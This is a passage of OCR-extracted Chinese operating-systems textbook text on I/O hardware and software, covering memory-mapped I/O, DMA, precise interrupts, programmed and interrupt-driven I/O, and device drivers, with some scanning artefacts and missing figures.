例如，在屏幕上显 示像素的常规方法是使用一个视频RAM, 这 一RAM 基本上只是一个数据缓冲区，可供程序或操作系统 写入数据。
于是，问题就出现了：CPU 如何与设备的控制寄存器和数据缓冲区进行通信?
存在两个可选的方法。
在第一个方法中，每个控制寄存器被分配一个I/O 端 口 (I/O port) 号，这是一个8位或16位的整数。
所 有I/O端口形成I/O 端口空间 (I/O port space),并且受到保护使得普通的用户程序不能对其进行访问(只 有操作系统可以访问)。
使用一条特殊的I/O 指令，例如
IN REG,PORT
CPU 可以读取控制寄存器PORT 的内容并将结果存入到CPU 寄存器REG 中。
类似地，使用
OUT PORT,REG
CPU 可以将REG 的内容写入到控制寄存器中。
大多数早期计算机，包括几乎所有大型主机，如IBM 360 及其所有后续机型，都是以这种方式工作的。
在这一方案中，内存地址空间和I/O地址空间是不同的，如图5-2a所示。
指令
IN R0,4 和
MOV R0,4
在这一设计中完全不同。
前者读取I/O端口4的内容并将其存入R0, 而后者则读取内存字4的内容并将其 存入R0 。
因此，这些例子中的4引用的是不同且不相关的地址空间。
两个地址空间 0xFFFF.
0
a)
内存
I/O端口
一个地址空间
b)
两个地址空间
c)
图5-2 a) 单独的I/O和内存空间；b) 内存映射I/O;c) 混合方案
第二个方法是PDP-11引入的，它将所有控制寄存器映射到内存空间中，如图5-2b所示。
每个控制寄 存器被分配唯一的一个内存地址，并且不会有内存被分配这一地址。
这样的系统称为内存映射I/O (memory-mapped I/O)。
在大多数系统中，分配给控制寄存器的地址位于或者靠近地址空间的顶端。
图 5-2c所示是一种混合的方案，这一方案具有内存映射I/O的数据缓冲区，而控制寄存器则具有单独的I/O 端口。
x86 采用这一体系结构。
在IBM PC兼容机中，除了0到64K-1 的I/O端口之外，640K到1M-1 的 内 存地址保留给设备的数据缓冲区。
第二，对于内存映射I/O, 不需要特殊的保护机制来阻止用户进程执行I/O操作。
操作系统必须要做 的全部事情只是避免把包含控制寄存器的那部分地址空间放入任何用户的虚拟地址空间之中。
更为有利 的是，如果每个设备在地址空间的不同页面上拥有自己的控制寄存器，操作系统只要简单地通过在其页 表中包含期望的页面就可以让用户控制特定的设备而不是其他设备。
这样的方案可以使不同的设备驱动 程序放置在不同的地址空间中，不但可以减小内核的大小，而且可以防止驱动程序之间相互干扰。
第三，对于内存映射I/O, 可以引用内存的每 一 条指令也可以引用控制寄存器。
例如，如果存在 一 条指令TEST 可以测试 一 个内存字是否为0,那么它也可以用来测试 一 个控制寄存器是否为0,控制寄存 器为0可以作为信号，表明设备空闲并且可以接收一条新的命令。
汇编语言代码可能是这样的：
LOOP:
READY:
TEST PORT_4 BEQ READY
BRANCH LOOP
1/检测端口4是否为0
II如果为0,转向READY 1/否则，继续测试
在计算机设计中，实际上任何事情都要涉及权衡，此处也不例外。
内存映射I/O 也有缺点。
首先， 现今大多数计算机都拥有某种形式的内存字高速缓存。
对一个设备控制寄存器进行高速缓存可能是灾难 性的。
在存在高速缓存的情况下考虑上面给出的汇编代码循环。
第一次引用PORT_4 将导致它被高速缓 存，随后的引用将只从高速缓存中取值并且不会再查询设备。
之后当设备最终变为就绪时，软件将没有 办法发现这一点。
结果，循环将永远进行下去。
对内存映射I/O, 为了避免这一情形，硬件必须能够针对每个页面有选择性地禁用高速缓存。
操作 系统必须管理选择性高速缓存，所以这一特性为硬件和操作系统两者增添了额外的复杂性。
其次，如果只存在一个地址空间，那么所有的内存模块和所有的I/O 设备都必须检查所有的内存引 用，以便了解由谁做出响应。
如果计算机具有单一总线，如图5-3a 所示，那么让每个内存模块和I/O 设备 查看每个地址是简单易行的。
CPU读写内存
转到该高带宽总线
CPU 内存 I/O CPU 内存 I/O
所有的内存和I/O地 该内存端口允许
址走向此处 总线 I/O设备访问内存
a) b)
图5-3 a) 单总线体系结构；b) 双总线内存体系结构
然而，现代个人计算机的趋势是包含专用的高速内存总线，如图5-3b所示。
装备这一总线是为了优 化内存性能，而不是为了慢速的I/O设备而做的折中。
x86 系统甚至可以有多种总线(内存、PCle 、SCSI 和USB), 如图1-12所示。
在内存映射的机器上具有单独的内存总线的麻烦是I/O 设备没有办法查看内存地址，因为内存地址 旁路到内存总线上，所以没有办法响应。
此外，必须采取特殊的措施使内存映射I/O 工作在具有多总线 的系统上。
一种可能的方法是首先将全部内存引用发送到内存，如果内存响应失败，CPU 将尝试其他总 线。
这一设计是可以工作的，但是需要额外的硬件复杂性。
第二种可能的设计是在内存总线上放置一个探查设备，放过所有潜在地指向所关注的I/O 设备的地 址。
此处的问题是，I/O 设备可能无法以内存所能达到的速度处理请求。
第三种可能的设计是在内存控制器中对地址进行过滤，这种设计很好地与图1-12中所描述的设计相 匹配。
在这种情形下，内存控制器芯片中包含在引导时预装载的范围寄存器。
例如，640K到1M-1 可能 被标记为非内存范围。
落在标记为非内存的那些范围之内的地址将被转发给设备而不是内存。
这一设计 的缺点是需要在引导时判定哪些内存地址不是真正的内存地址。
因而，每一设计都有支持它和反对它的 论据，所以折中和权衡是不可避免的。
5.1.4 直接存储器存取
无论一个CPU是否具有内存映射I/O, 它都需要寻址设备控制器以便与它们交换数据。
CPU可以从 I/O控制器每次请求一个字节的数据，但是这样做浪费CPU的时间，所以经常用到一种称为直接存储器 存取 (Direct Memory Access,DMA) 的不同方案。
为简化解释，我们假设CPU通过单一的系统总线访
无论DMA控制器在物理上处于什么地方，它都能够独立于CPU而访问系统总线，如图5-4所示。
它 包含若干个可以被CPU读写的寄存器，其中包括一个内存地址寄存器、一个字节计数寄存器和一个或多 个控制寄存器。
控制寄存器指定要使用的I/O端口、传送方向(从I/O设备读或写到I/O设备)、传送单位 (每次一个字节或每次一个字)以及在一次突发传送中要传送的字节数。
图5-4 DMA传送操作
为了解释DMA的工作原理，让我们首先看一下没有使用DMA时磁盘如何读。
首先，控制器从磁盘 驱动器串行地、 一位一位地读一个块(一个或多个扇区),直到将整块信息放入控制器的内部缓冲区中。
接着，它计算校验和，以保证没有读错误发生。
然后控制器产生一个中断。
当操作系统开始运行时，它 重复地从控制器的缓冲区中一次一个字节或一个字地读取该块的信息，并将其存入内存中。
使用DMA时，过程是不同的。
首先，CPU 通过设置DMA控制器的寄存器对它进行编程，所以DMA 控制器知道将什么数据传送到什么地方(图5-4中的第1步)。
DMA 控制器还要向磁盘控制器发出一个命 令，通知它从磁盘读数据到其内部的缓冲区中，并且对校验和进行检验。
如果磁盘控制器的缓冲区中的 数据是有效的，那么DMA就可以开始了。
DMA控制器通过在总线上发出一个读请求到磁盘控制器而发起DMA传送(第2步)。
这一读请求看 起来与任何其他读请求是一样的，并且磁盘控制器并不知道或者并不关心它是来自CPU还是来自DMA 控制器。
一般情况下，要写的内存地址在总线的地址线上，所以当磁盘控制器从其内部缓冲区中读取下 一个字的时候，它知道将该字写到什么地方。
写到内存是另一个标准总线周期(第3步)。
当写操作完成 时，磁盘控制器在总线上发出一个应答信号到DMA控制器(第4步)。
于是，DMA 控制器步增要使用的 内存地址，并且步减字节计数。
如果字节计数仍然大于0,则重复第2步到第4步，直到字节计数到达0。
此 时 ，DMA 控制器将中断CPU以便让CPU 知道传送现在已经完成了。
当操作系统开始工作时，用不着 将磁盘块复制到内存中，因为它已经在内存中了。
许多总线能够以两种模式操作：每次一字模式和块模式。
某些DMA控制器也能够以这两种模式操
作。
在前一个模式中，操作如上所述：DMA 控制器请求传送一个字并且得到这个字。
如果CPU也想使 用总线，它必须等待。
这一机制称为周期窃取 (cycle stealing),因为设备控制器偶尔偷偷溜入并且从 CPU偷走一个临时的总线周期，从而轻微地延迟CPU 。
在块模式中，DMA 控制器通知设备获得总线， 发起一连串的传送，然后释放总线。
这一操作形式称为突发模式(burst mode)。
它比周期窃取效率更高， 因为获得总线占用了时间，并且以一次总线获得的代价能够传送多个字。
突发模式的缺点是，如果正在 进行的是长时间突发传送，有可能将CPU和其他设备阻塞相当长的周期。
大多数DMA控制器使用物理内存地址进行传送。
使用物理地址要求操作系统将预期的内存缓冲区 的虚拟地址转换为物理地址，并且将该物理地址写入DMA控制器的地址寄存器中。
在少数DMA控制器 中使用的一个替代方案是将虚拟地址写入DMA控制器，然后DMA控制器必须使用MMU来完成虚拟地址 到物理地址的转换。
只有在MMU是内存的组成部分(有可能，但罕见)而不是CPU的组成部分的情况 下，才可以将虚拟地址放到总线上。
我们在前面提到，在DMA可以开始之前，磁盘首先要将数据读入其内部的缓冲区中。
你也许会产 生疑问：为什么控制器从磁盘读取字节后不立即将其存储在主存中?
换句话说，为什么需要一个内部缓 冲区?
有两个原因。
首先，通过进行内部缓冲，磁盘控制器可以在开始传送之前检验校验和。
如果校验 和是错误的，那么将发出一个表明错误的信号并且不会进行传送。
第二个原因是，一旦磁盘传送开始工作，从磁盘读出的数据就是以固定速率到达的，而不论控制器 是否准备好接收数据。
如果控制器要将数据直接写到内存，则它必须为要传送的每个字取得系统总线的 控制权。
此时，若由于其他设备使用总线而导致总线忙(例如在突发模式中),则控制器只能等待。
如 果在前一个磁盘字还未被存储之前下一个磁盘字到达，控制器只能将它存放在某个地方。
如果总线非常 忙，控制器可能需要存储很多字，而且还要完成大量的管理工作。
如果块被放入内部缓冲区，则在 DMA 启动前不需要使用总线，这样，控制器的设计就可以简化，因为对DMA 到内存的传送没有严格的 时间要求。
(事实上，有些老式的控制器是直接存取内存的，其内部缓冲区设计得很小，但是当总线很 忙时，一些传送有可能由于超载运行错误而被终止。
)
并不是所有的计算机都使用DMA。
反对的论据是主CPU通常要比DMA控制器快得多，做同样的工 作可以更快(当限制因素不是I/O设备的速度时)。
如果CPU没有其他工作要做，让(快速的)CPU 等待 (慢速的)DMA控制器完成工作是无意义的。
此外，去除DMA控制器而让CPU用软件做所有的工作还可 以节约金钱，这一点在低端(嵌入式)计算机上十分重要。
5.1.5 重温中断
我们在1.3.4节中简要介绍了中断，但是还有更多的内容要介绍。
在一台典型的个人计算机系统中， 中断结构如图5-5所示。
在硬件层面，中断的工作如下所述。
当一个I/O设备完成交给它的工作时，它就 产生一个中断(假设操作系统已经开放中断),它是通过在分配给它的一条总线信号线上置起信号而产 生中断的。
该信号被主板上的中断控制器芯片检测到，由中断控制器芯片决定做什么。
总线
图5-5 中断是怎样发生的。
设备与中断控制器之间的连接实际上使用的是总线上的中断线而不是专用连线
为了处理中断，中断控制器在地址线上放置一个数字表明哪个设备需要关注，并且置起一个中断 CPU 的信号。
将这些信息保存到什么地方是一个问题。
一种选择是将其放入内部寄存器中，在需要时操作系统可 以读出这些内部寄存器。
这一方法的问题是，中断控制器之后无法得到应答，直到所有可能的相关信息 被读出，以免第二个中断重写内部寄存器保存状态。
这一策略在中断被禁止时将导致长时间的死机，并 且可能丢失中断和丢失数据。
因此，大多数CPU在堆栈中保存信息。
然而，这种方法也有问题。
首先，使用谁的堆栈?
如果使用 当前堆栈，则它很可能是用户进程的堆栈。
堆栈指针甚至可能不是合法的，这样当硬件试图在它所指的 地址处写某些字时，将导致致命错误。
此外，它可能指向一个页面的末端。
若干次内存写之后，页面边 界可能被超出并且产生一个页面故障。
在硬件中断处理期间如果发生页面故障将引起更大的问题：在何 处保存状态以处理页面故障?
精确中断和不精确中断
另一个问题是由下面这样的事实引起的：现代CPU大量地采用流水线并且有时还采用超标量(内部 并行)。
在老式的系统中，每条指令完成执行之后，微程序或硬件将检查是否存在悬而未决的中断。
如 果存在，那么程序计数器和PSW将被压入堆栈中而中断序列将开始。
在中断处理程序运行之后，相反的 过程将会发生，旧的PSW和程序计数器将从堆栈中弹出并且先前的进程继续运行。
这一模型使用了隐含的假设，这就是如果一个中断正好在某一指令之后发生，那么这条指令前的所 有指令(包括这条指令)都完整地执行过了，而这条指令后的指令一条也没有执行。
在老式的机器上， 这一假设总是正确的，而在现代计算机上，这一假设则未必是正确的。
首先，考虑图1-6a的流水线模型。
在流水线满的时候(通常的情形),如果出现一个中断，那么会 发生什么情况?
许多指令正处于各种不同的执行阶段，当中断出现时，程序计数器的值可能无法正确地 反映已经执行过的指令和尚未执行的指令之间的边界。
事实上，许多指令可能部分地执行了，不同的指 令完成的程度或多或少。
在这种情况下，程序计数器更有可能反映的是将要被取出并压入流水线的下一 条指令的地址，而不是刚刚被执行单元处理过的指令的地址。
处于不同的完成状态，它们与程序计数器之间没有什么关系。
将机器留在一个明确状态的中断称为精确中断 (precise interrupt;Walker 和Cragon,1995) 。
精确 中断具有4个特性：
1)PC (程序计数器)保存在一个已知的地方。
2)PC 所指向的指令之前的所有指令已经完全执行。
3)PC 所指向的指令之后的所有指令都没有执行。
4)PC 所指向的指令的执行状态是已知的。
注意，对于PC所指向的指令之后的那些指令来说，此处并没有禁止它们开始执行，而只是要求在
中断发生之前必须撤销它们对寄存器或内存所 做的任何修改。
PC 所指向的指令有可能已经执 行了，也有可能还没有执行，然而，必须清楚 适用的是哪种情况。
通常，如果中断是一个I/O 中断，那么指令就会还没有开始执行。
然而， 如果中断实际上是一个陷阱或者页面故障，那 么PC一般指向导致错误的指令，所以它以后可 以重新开始执行。
图5-6a所示的情形描述了精
图5-6 a) 精确中断；b) 不精确中断
确中断。
程序计数器(316)之前的所有指令都已经完成了，而它之后的指令都还没有启动(或者已经 回退以撤销它们的作用)。
有些计算机设计成某些种类的中断和陷阱是精确的，而其他的不是。
例如，可以让I/O中断是精确 的，而归因于致命编程错误的陷阱是不精确的，由于在被0除之后不需要尝试重新开始运行的进程，所 以这样做也不错。
有些计算机具有一个位，可以设置它强迫所有的中断都是精确的。
设置这一位的不利 之处是，它强迫CPU 仔细地将正在做的一切事情记入日志并且维护寄存器的影子副本，这样才能够在任 意时刻生成精确中断。
所有这些开销都对性能具有较大的影响。
5.2 I/O软件原理
在讨论了I/O硬件之后，下面我们来看一看I/O软件。
首先我们将看一看I/O软件的目标，然后从操作 系统的观点来看一看I/O实现的不同方法。
5.2.1 I/O软件的目标
在设计I/O软件时一个关键的概念是设备独立性 (device independence)。
它的意思是应该能够编写 出这样的程序：它可以访问任意I/O 设备而无需事先指定设备。
例如，读取一个文件作为输入的程序应 该能够在硬盘、DVD 或者USB盘上读取文件，无需为每一种不同的设备修改程序。
类似地，用户应该能 够键入这样一条命令
sort <input>output
并且无论输入来自任意类型的存储盘或者键盘，输出送往任意类型的存储盘或者屏幕，上述命令都可以 工作。
尽管这些设备实际上差别很大，需要非常不同的命令序列来读或写，但这一事实所带来的问题将 由操作系统负责处理。
与设备独立性密切相关的是统 一命名(unifo rm naming) 这一 目标。
一个文件或一个设备的名字应 该是一个简单的字符串或一个整数，它不应依赖于设备。
在UNIX 系统中，所有存储盘都能以任意方式 集成到文件系统层次结构中，因此，用户不必知道哪个名字对应于哪台设备。
例如， 一个USB 盘可以安 装 (mount) 到目录/usr/ast/backup 下，这样复制一个文件到/usr/ast/backup/monday 就是将文件复制到 USB盘上。
用这种方法，所有文件和设备都采用相同的方式——路径名进行寻址。
I/O 软件的另一个重要问题是错误处理 (error handling)。
一般来说，错误应该尽可能地在接近硬件 的层面得到处理。
当控制器发现了一个读错误时，如果它能够处理那么就应该自己设法纠正这一错误。
如果控制器处理不了，那么设备驱动程序应当予以处理，可能只需重读一次这块数据就正确了。
很多错 误是偶然性的，例如，磁盘读写头上的灰尘导致读写错误时，重复该操作，错误经常就会消失。
只有在 低层软件处理不了的情况下，才将错误上交高层处理。
在许多情况下，错误恢复可以在低层透明地得到 解决，而高层软件甚至不知道存在这一错误。
I/O软件的另一个问题是缓冲 (buffering)。
数据离开一个设备之后通常并不能直接存放到其最终的 目的地。
例如，从网络上进来一个数据包时，直到将该数据包存放在某个地方并对其进行检查，操作系 统才知道要将其置于何处。
此外，某些设备具有严格的实时约束(例如，数字音频设备),所以数据必 须预先放置到输出缓冲区之中，从而消除缓冲区填满速率和缓冲区清空速率之间的相互影响，以避免缓 冲区欠载。
缓冲涉及大量的复制工作，并且经常对I/O性能有重大影响。
此处我们将提到的最后一个概念是共享设备和独占设备的问题。
有些I/O 设备(如磁盘)能够同时 让多个用户使用。
多个用户同时在同一磁盘上打开文件不会引起什么问题。
其他设备(如磁带机)则必 须由单个用户独占使用，直到该用户使用完，另一个用户才能拥有该磁带机。
让两个或更多的用户随机 地将交叉混杂的数据块写入相同的磁带是注定不能工作的。
独占(非共享)设备的引入也带来了各种各 样的问题，如死锁。
同样，操作系统必须能够处理共享设备和独占设备以避免问题发生。
5.2.2 程序控制I/O
I/O 可以采用三种根本上不同的方式来实现。
在本小节中我们将介绍第一种(程序控制I/O), 在 后 面两小节中我们将研究另外两种(中断驱动I/O 和使用DMA的I/O) 。
I/O 的最简单形式是让CPU 做全部工 作，这一方法称为程序控制I/O(programmed I/O)。
借助于例子来说明程序控制I/O是最简单的。
考虑一个用户进程，该进程想通过串行接口在打印机 上打印8个字符的字符串“ABCDEFGH”。
在某些嵌入式系统上显示有时就是这样工作的。
软件首先要 在用户空间的一个缓冲区中组装字符串，如图5-7a所示。
然后，用户进程通过发出打开打印机一类的系统调用来获得打印机以便进行写操作。
如果打印机当前被 另一个进程占用，该系统调用将失败并返回一个错误代码，或者将阻塞直到打印机可用，具体情况取决于操 作系统和调用参数。
一旦拥有打印机，用户进程就发出一个系统调用通知操作系统在打印机上打印字符串。
图5-7 打印一个字符串的步骤
一旦将第一个字符复制到打印机，操作系统就要查看打印机是否就绪准备接收另一个字符。
一般而 言，打印机都有第二个寄存器，用于表明其状态。
将字符写到数据寄存器的操作将导致状态变为非就绪。
当打印机控制器处理完当前字符时，它就通过在其状态寄存器中设置某一位或者将某个值放到状态寄存 器中来表示其可用性 。
这时，操作系统将等待打印机状态再次变为就绪。
打印机就绪事件发生时，操作系统就打印下一个 字符，如图5-7c所示。
这一循环继续进行，直到整个字符串打印完。
然后，控制返回到用户进程。
操作系统相继采取的操作简要地总结在图5-8中。
首先，数据被复制到内核空间。
然后，操作系统 进入一个密闭的循环， 一次输出一个字符。
在该图中，清楚地说明了程序控制I/O的最根本的方面，这 就是输出一个字符之后，CPU 要不断地查询设备以了解它是否就绪准备接收另一个字符。
这一行为经常 称为轮询 (polling) 或忙等待 (busy waiting)。
图5-8 使用程序控制I/O将一个字符串写到打印机
5.2.3 中断驱动I/O
现在我们考虑在不缓冲字符而是在每个字符到来时便打印的打印机上进行打印的情形。
如果打印机 每秒可以打印100个字符，那么打印每个字符将花费10ms。
这意味着，当每个字符写到打印机的数据寄 存器中之后，CPU 将有10ms搁置在无价值的循环中，等待允许输出下一个字符。
这10ms时间足以进行 一次上下文切换并且运行其他进程，否则就浪费了。
这种允许CPU在等待打印机变为就绪的同时做某些其他事情的方式就是使用中断。
当打印字符串的 系统调用被发出时，如我们前面所介绍的，字符串缓冲区被复制到内核空间，并且一旦打印机准备好接 收一个字符时就将第一个字符复制到打印机中。
这时，CPU 要调用调度程序，并且某个其他进程将运行。
请求打印字符串的进程将被阻塞，直到整个字符串打印完。
系统调用所做的工作如图5-9a所示。
输出下 一 个字符，应答中断，并且返回到中断之前正在运行的进程，该进程将从其停止的地方继续运行。
图5-9 使用中断驱动I/O将一个字符串写到打印机：a) 当打印系统调用被发出时执行的代码；
5.2.4 使 用DMA 的I/O
中断驱动I/O的一个明显缺点是中断发生在每个字符上。
中断要花费时间，所以这一方法将浪费一 定数量的CPU时间。
这一问题的一种解决方法是使用DMA。
此处的思路是让DMA 控制器一次给打印机
提供 一 个字符，而不必打扰CPU 。
本 质 上 ， DMA是程序控制I/O, 只是由DMA控制器 而不是主CPU做全部工作。
这一策略需要 特殊的硬件(DMA 控制器),但是使CPU 获得自由从而可以在I/O 期间做其他工作。
使用DMA的代码概要如图5-10所示。
DMA重大的成功是将中断的次数从
打印每个字符一次减少到打印每个缓冲区一次。
如果有许多字符并且中断十分缓慢，那么采用DMA 可 能是重要的改进。
另一方面，DMA 控制器通常比主CPU要慢很多。
如果DMA 控制器不能以全速驱动设 备，或者CPU在等待DMA中断的同时没有其他事情要做，那么采用中断驱动I/O甚至采用程序控制I/O也 许更好。
5.3 I/O软 件 层 次
I/O 软件通常组织成四个层次，如图5-11所示。
每一层具有一个要执行的定义明确的功能和一个的
定义明确的与邻近层次的接口。
功能与接 口随系统的不同而不同，所以下面的讨论 并不针对一种特定的机器。
我们将从底层 开始讨论每 一 层。
5.3.1 中断处理程序
虽然程序控制I/O偶尔是有益的，但是 对于大多数I/O而言，中断是令人不愉快的 事情并且无法避免。
应当将其深深地隐藏
图5-11 I/O软件系统的层次
在操作系统内部，以便系统的其他部分尽量不与它发生联系。
隐藏它们的最好办法是将启动一个I/O操 作的驱动程序阻塞起来，直到I/O 操作完成并且产生一个中断。
驱动程序可以阻塞自己，例如，在一个 信号量上执行down 操作、在一个条件变量上执行wait操作、在一个消息上执行receive操作或者某些类 似的操作。
当中断发生时，中断处理程序将做它必须要做的全部工作以便对中断进行处理。
然后，它可以将启 动中断的驱动程序解除阻塞。
在一些情形中，它只是在一个信号量上执行up 操作；其他情形中，是对管 程中的条件变量执行signal 操作；还有一些情形中，是向被阻塞的驱动程序发一个消息。
在所有这些情 形中，中断最终的结果是使先前被阻塞的驱动程序现在能够继续运行。
如果驱动程序构造为内核进程，
具有它们自己的状态、堆栈和程序计数器，那么这一模型运转得最好。
当然，现实没有如此简单。
对一个中断进行处理并不只是简单地捕获中断，在某个信号量上执行 up 操作，然后执行一条IRET 指令从中断返回到先前的进程。
对操作系统而言，还涉及更多的工作。
我 们将按一系列步骤给出这一工作的轮廓，这些步骤是硬件中断完成之后必须在软件中执行的。
应该注意 的是，细节是非常依赖于系统的，所以下面列出的某些步骤在一个特定的机器上可能是不必要的，而没 有列出的步骤可能是必需的。
此外，确实发生的步骤在某些机器上也可能有不同的顺序。
1)保存没有被中断硬件保存的所有寄存器(包括PSW)。
4)应答中断控制器，如果不存在集中的中断控制器，则再次开放中断。
5)将寄存器从它们被保存的地方(可能是某个堆栈)复制到进程表中。
7)选择下一次运行哪个进程，如果中断导致某个被阻塞的高优先级进程变为就绪，则可能选择它现 在就运行。
8)为下一次要运行的进程设置MMU上下文，也许还需要设置某个TLB。
9)装入新进程的寄存器，包括其PSW。
10)开始运行新进程。
由此可见，中断处理远不是无足轻重的小事。
它要花费相当多的CPU指令，特别是在存在虚拟内存 并且必须设置页表或者必须保存MMU状态(例如R和M位)的机器上。
在某些机器上，当在用户态与核 心态之间切换时，可能还需要管理TLB 和CPU 高速缓存，这就要花费额外的机器周期。
5.3.2 设备驱动程序
在本章前面的内容中，我们介绍了设备控制器所做的工作。
我们注意到每一个控制器都设有某些设 备寄存器用来向设备发出命令，或者设有某些设备寄存器用来读出设备的状态，或者设有这两种设备寄 存器。
设备寄存器的数量和命令的性质在不同设备之间有着根本性的不同。
例如，鼠标驱动程序必须从 鼠标接收信息，以识别鼠标移动了多远的距离以及当前哪一个键被按下。
相反，磁盘驱动程序可能必须 要了解扇区、磁道、柱面、磁头、磁盘臂移动、电机驱动器、磁头定位时间以及所有其他保证磁盘正常 工作的机制。
显然，这些驱动程序是有很大区别的。
因此，每个连接到计算机上的I/O设备都需要某些设备特定的代码来对其进行控制。
这样的代码称 为设备驱动程序 (device driver),它一般由设备的制造商编写并随同设备一起交付。
因为每一个操作系 统都需要自己的驱动程序，所以设备制造商通常要为若干流行的操作系统提供驱动程序。
每个设备驱动程序通常处理一种类型的设备，或者至多处理一类紧密相关的设备。
例如，SCSI 磁 盘驱动程序通常可以处理不同大小和不同速度的多个SCSI 磁盘，或许还可以处理SCSI 蓝光光盘。
而另 一方面，鼠标和游戏操纵杆是如此的不同，以至于它们通常需要不同的驱动程序。
然而，对于一个设备 驱动程序控制多个不相关的设备并不存在技术上的限制，只是这样做并不是一个好主意。
不过在有些时候，极其不同的设备却基于相同的底层技术。
众所周知的例子可能是USB, 这是一种 串行总线技术，称其为“通用”并不是无缘无故的。
USB 设备包括磁盘、记忆棒、照相机、鼠标、键盘、 微型风扇、无线网卡、机器人、信用卡读卡器、可充电剃须刀、碎纸机、条形码扫描仪、迪斯科球以及 便携式温度计。
它们都使用USB, 但是它们做着非常不同的事情。
此处的技巧是USB驱动程序通常是堆 栈式的，就像是网络中的TCP/IP 栈。
在底层，特别是在硬件中，我们会发现USB链路层(串行I/O), 这 一层处理硬件事物，例如发信号以及将信号流译码成USB包。
这一层被较高的层次所使用，而这些较高 的层次则处理数据包以及被大多数设备所共享的USB通用功能。
最后，在顶层我们会发现高层API, 例 如针对大容量存储设备和照相机等的接口。
因此，我们依然拥有分开的设备驱动程序，尽管它们共享部 分协议栈。
为了访问设备的硬件(意味着访问设备控制器的寄存器),设备驱动程序通常必须是操作系统内核 的一部分，至少对目前的体系结构是如此。
实际上，有可能构造运行在用户空间的驱动程序，使用系统
调用来读写设备寄存器。
这一设计使内核与驱动程序相隔离，并且使驱动程序之间相互隔离，这样做可
以消除系统崩溃的一个主要源头——有问 题的驱动程序以这样或那样的方式干扰内 核。
对于建立高度可靠的系统而言，这绝 对 是 正 确 的 方 向 。
MINIX 3(www. minix3.org) 就是一个这样的系统，其中 设备驱动程序就作为用户进程而运行。
然 而，因为大多数其他桌面操作系统要求驱 动程序运行在内核中，所以我们在这里只 考虑这样的模型。
因为操作系统的设计者知道由外人 编写的驱动程序代码片断将被安装在操 作系统的内部，所以需要有一个体系结 构来允许这样的安装。
这意味着要有一 个定义明确的模型，规定驱动程序做什 么事情以及如何与操作系统的其余部分 相互作用。
设备驱动程序通常位于操作 系统其余部分的下面，如图5-12所示。
操作系统通常将驱动程序归类于少 数的类别之一。
最为通用的类别是块设备 (block device)和字符设备 (character device)。
块设备(例如磁盘)包含多个 可以独立寻址的数据块，字符设备(例如 键盘和打印机)则生成或接收字符流。
图5-12 设备驱动程序的逻辑定位。
实际上，驱动程序和设 备控制器之间的所有通信都通过总线
大多数操作系统都定义了一个所有块设备都必须支持的标准接口，并且还定义了另一个所有字符设 备都必须支持的标准接口。
这些接口由许多过程组成，操作系统的其余部分可以调用它们让驱动程序工 作。
典型的过程是那些读一个数据块(对块设备而言)或者写一个字符串(对字符设备而言)的过程。
随着个人计算机的出现，这一模型不再起作用，因为个人计算机有太多种类的I/O 设备。
即便拥有 源代码或目标模块，也只有很少的用户有能力重新编译和重新连接内核，何况他们并不总是拥有源代码 或目标模块。
为此，从MS-DOS 开始，操作系统转向驱动程序在执行期间动态地装载到系统中的另一个 模型。
不同的操作系统以不同的方式处理驱动程序的装载工作。
设备驱动程序具有若干功能。
最明显的功能是接收来自其上方与设备无关的软件所发出的抽象的读 写请求，并且目睹这些请求被执行。
除此之外，还有一些其他的功能必须执行。
例如，如果需要的话， 驱动程序必须对设备进行初始化。
它可能还需要对电源需求和日志事件进行管理。
许多设备驱动程序具有相似的一般结构。
典型的驱动程序在启动时要检查输入参数，检查输入参数 的目的是搞清它们是否是有效的，如果不是，则返回一个错误。
如果输入参数是有效的，则可能需要进 行从抽象事项到具体事项的转换。
对磁盘驱动程序来说，这可能意味着将一个线性的磁盘块号转换成磁 盘几何布局的磁头、磁道、扇区和柱面号。
接着，驱动程序可能要检查设备当前是否在使用。
如果在使用，请求将被排入队列以备稍后处理。
如果设备是空闲的，驱动程序将检查硬件状态以了解请求现在是否能够得到处理。
在传输能够开始之前， 可能需要接通设备或者启动马达。
一旦设备接通并就绪，实际的控制就可以开始了。
控制设备意味着向设备发出一系列命令。
根据控制设备必须要做的工作，由驱动程序处确定命令序 列。
驱动程序在获知哪些命令将要发出之后，它就开始将它们写入控制器的设备寄存器。
驱动程序在把
202 第 5 章
每个命令写到控制器之后，它可能必须进行检测以了解控制器是否已经接收命令并且准备好接收下一个 命令。
这一序列继续进行，直到所有命令被发出。
对于某些控制器，可以为其提供一个在内存中的命令 链表，并且告诉它自己去读取并处理所有命令而不需要操作系统提供进一步帮助。
命令发出之后，会牵涉两种情形之一。
在多数情况下，设备驱动程序必须等待，直到控制器为其做 某些事情，所以驱动程序将阻塞其自身直到中断到来解除阻塞。
然而，在另外一些情况下，操作可以无 延迟地完成，所以驱动程序不需要阻塞。
在字符模式下滚动屏幕只需要写少许字节到控制器的寄存器中， 由于不需要机械运动，所以整个操作可以在几纳秒内完成，这便是后一种情形的例子。
在前一种情况下，阻塞的驱动程序可以被中断唤醒。
在后一种情况下，驱动程序根本就不会休眠。
无论是哪一种情况，操作完成之后驱动程序都必须检查错误。
如果一切顺利，驱动程序可能要将数据 (例如刚刚读出的一个磁盘块)传送给与设备无关的软件。
最后，它向调用者返回一些用于错误报告的 状态信息。
如果还有其他未完成的请求在排队，则选择一个启动执行。
如果队列中没有未完成的请求， 则该驱动程序将阻塞以等待下一个请求。
这一简单的模型只是现实的粗略近似，许多因素使相关的代码比这要复杂得多。
首先，当一个驱动 程序正在运行时，某个I/O 设备可能会完成操作，这样就会中断驱动程序。
中断可能会导致一个设备驱 动程序运行，事实上，它可能导致当前驱动程序运行。
例如，当网络驱动程序正在处理一个到来的数据 包时，另一个数据包可能到来。
因此，驱动程序必须是重入的 (reentrant), 这意味着一个正在运行的驱 动程序必须预料到在第一次调用完成之前第二次被调用。
驱动程序不允许进行系统调用，但是它们经常需要与内核的其余部分进行交互。
对某些内核过程的 调用通常是允许的。
例如，通常需要调用内核过程来分配和释放硬接线的内存页面作为缓冲区。
还可能 需要其他有用的调用来管理MMU 、定时器、DMA 控制器、中断控制器等。
5.3.3 与设备无关的I/O软 件
虽然I/O 软件中有一些是设备特定的，但是其他部分I/O 软件是与设备无关的。
设备驱动程序和与设
备无关的软件之间的确切界限依赖于具体系统(和设备), 因为对于一些本来应按照与设备无关方式实现的功能， 出于效率和其他原因，实际上是由驱动程序来实现的。
图5-13所示的功能典型地由与设备无关的软件实现。
与设备无关的软件的基本功能是执行对所有设备公共 的I/O功能，并且向用户层软件提供一个统一的接口。
接下
来我们将详细介绍上述问题。
图5-13 与设备无关的I/O软件的功能
1.设备驱动程序的统一接口
